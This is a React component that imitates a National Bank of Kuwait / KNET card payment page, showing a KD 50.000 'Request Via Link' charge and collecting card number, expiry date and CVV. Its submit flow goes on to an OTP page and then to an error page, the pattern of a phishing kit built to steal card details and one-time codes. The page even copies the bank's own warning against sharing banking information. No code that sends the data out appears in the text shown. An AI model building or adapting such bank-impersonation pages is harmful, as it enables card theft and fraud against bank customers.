
import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";

const CardDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    cardNumber: "",
    expiryMonth: "",
    expiryYear: "",
    cvv: ""
  });
  const [loading, setLoading] = useState(false);

  const formatCardNumber = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '');
    const formatted = digitsOnly.replace(/(.{4})/g, '$1 ').trim();
    return formatted.slice(0, 19);
  };

  const handleInputChange = (field: string, value: string) => {
    if (field === 'cardNumber') {
      setFormData({...formData, [field]: formatCardNumber(value)});
    } else if (field === 'cvv') {
      setFormData({...formData, [field]: value.replace(/\D/g, '').slice(0, 3)});
    } else if (field === 'expiryMonth') {
      setFormData({...formData, [field]: value.replace(/\D/g, '').slice(0, 2)});
    } else if (field === 'expiryYear') {
      setFormData({...formData, [field]: value.replace(/\D/g, '').slice(0, 4)});
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    
    setTimeout(() => {
      navigate(`/otp/${id}`);
    }, 2000);
  };

  const handleCancel = () => {
    navigate('/error');
  };

  return (
    <div className="min-h-screen bg-gray-100" style={{ backgroundColor: '#f5f5f5' }}>
      {/* NBK Advertisement Banner */}
      <div className="w-full h-32 bg-gradient-to-r from-blue-400 to-blue-600 relative overflow-hidden">
        <div className="absolute inset-0 flex items-center justify-between px-8">
          <div className="text-white text-right">
            <div className="text-lg font-bold mb-1">الجمهورية المصرفية الكويتية</div>
            <div className="text-sm">بنك الكويت الوطني</div>
          </div>
          <div className="text-white text-right">
            <div className="text-xl font-bold">الاحتيال له عدة</div>
            <div className="text-xl font-bold">أشكال وأنواع</div>
            <div className="text-sm">لا تشارك معلوماتك</div>
            <div className="text-sm">المصرفية مع أي أحد</div>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-8 max-w-2xl">
        {/* NBK Header Card */}
        <div className="bg-white rounded-2xl shadow-lg p-6 mb-6">
          <div className="text-center mb-6">
            <div className="flex items-center justify-center mb-4">
              <div className="text-2xl font-bold text-blue-800">
                الوطني
                <span className="text-blue-600 ml-2">NBK</span>
              </div>
              <div className="w-8 h-6 bg-blue-800 rounded ml-2"></div>
            </div>
          </div>
          
          <div className="border-t border-gray-200 pt-4">
            <div className="flex justify-between items-center mb-4">
              <span className="text-blue-600 font-medium">Request Via Link</span>
              <span className="text-gray-700">:المستفيد</span>
            </div>
            <div className="border-t border-gray-200 pt-2">
              <div className="flex justify-between items-center">
                <span className="text-blue-600 font-bold text-xl">KD 50.000</span>
                <span className="text-gray-700">:المبلغ</span>
              </div>
            </div>
          </div>
        </div>

        {/* Payment Form Card */}
        <div className="bg-white rounded-2xl shadow-lg p-6 mb-6">
          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Bank Selection */}
            <div className="space-y-2">
              <div className="flex justify-between items-center">
                <select className="w-full p-3 border-2 border-gray-300 rounded-lg text-center bg-white">
                  <option>يرجى اختيار البنك</option>
                </select>
                <label className="text-blue-600 font-medium mr-4 whitespace-nowrap">:يرجى اختيار البنك</label>
              </div>
            </div>

            {/* Card Number */}
            <div className="space-y-2">
              <div className="flex justify-between items-center">
                <div className="flex space-x-2 flex-1">
                  <select className="w-24 p-3 border-2 border-gray-300 rounded-lg text-center bg-white">
                    <option>بادئة</option>
                  </select>
                  <Input
                    type="text"
                    value={formData.cardNumber}
                    onChange={(e) => handleInputChange('cardNumber', e.target.value)}
                    className="flex-1 p-3 border-2 border-blue-400 rounded-lg text-center"
                    placeholder=""
                  />
                </div>
                <label className="text-blue-600 font-medium mr-4 whitespace-nowrap">:رقم بطاقة الصرف الآلي</label>
              </div>
            </div>

            {/* Expiry Date */}
            <div className="space-y-2">
              <div className="flex justify-between items-center">
                <div className="flex space-x-2">
                  <select 
                    value={formData.expiryYear}
                    onChange={(e) => handleInputChange('expiryYear', e.target.value)}
                    className="w-24 p-3 border-2 border-gray-300 rounded-lg text-center bg-white"
                  >
                    <option value="">YYYY</option>
                    <option value="2024">2024</option>
                    <option value="2025">2025</option>
                    <option value="2026">2026</option>
                    <option value="2027">2027</option>
                    <option value="2028">2028</option>
                    <option value="2029">2029</option>
                  </select>
                  <select 
                    value={formData.expiryMonth}
                    onChange={(e) => handleInputChange('expiryMonth', e.target.value)}
                    className="w-24 p-3 border-2 border-gray-300 rounded-lg text-center bg-white"
                  >
                    <option value="">MM</option>
                    {Array.from({length: 12}, (_, i) => (
                      <option key={i+1} value={String(i+1).padStart(2, '0')}>
                        {String(i+1).padStart(2, '0')}
                      </option>
                    ))}
                  </select>
                </div>
                <label className="text-blue-600 font-medium mr-4 whitespace-nowrap">:تاريخ انتهاء البطاقة</label>
              </div>
            </div>

            {/* CVV */}
            <div className="space-y-2">
              <div className="flex justify-between items-center">
                <Input
                  type="text"
                  value={formData.cvv}
                  onChange={(e) => handleInputChange('cvv', e.target.value)}
                  className="w-full p-3 border-2 border-blue-400 rounded-lg text-center"
                  placeholder=""
                  maxLength={3}
                />
                <label className="text-blue-600 font-medium mr-4 whitespace-nowrap">:الرقم السري</label>
              </div>
            </div>
          </form>
        </div>

        {/* Action Buttons Card */}
        <div className="bg-white rounded-2xl shadow-lg p-6">
          <div className="flex space-x-4">
            <button
              onClick={handleCancel}
              className="flex-1 bg-gray-300 text-gray-700 py-4 rounded-lg text-lg font-medium hover:bg-gray-400 transition-colors"
              disabled={loading}
            >
              إلغاء
            </button>
            <button
              onClick={() => navigate(`/otp/${id}`)}
              className="flex-1 bg-gray-300 text-gray-700 py-4 rounded-lg text-lg font-medium hover:bg-gray-400 transition-colors"
              disabled={loading}
            >
              {loading ? 'جاري التحميل...' : 'إرسال'}
            </button>
          </div>
        </div>

        {/* Footer */}
        <div className="text-center mt-8 text-gray-600">
          <div className="text-sm mb-2">جميع الحقوق محفوظة © 2025</div>
          <div className="text-sm text-blue-600">شركة الخدمات المصرفية الآلية المشتركة - كي نت</div>
        </div>
      </div>
    </div>
  );
};

export default CardDetails;
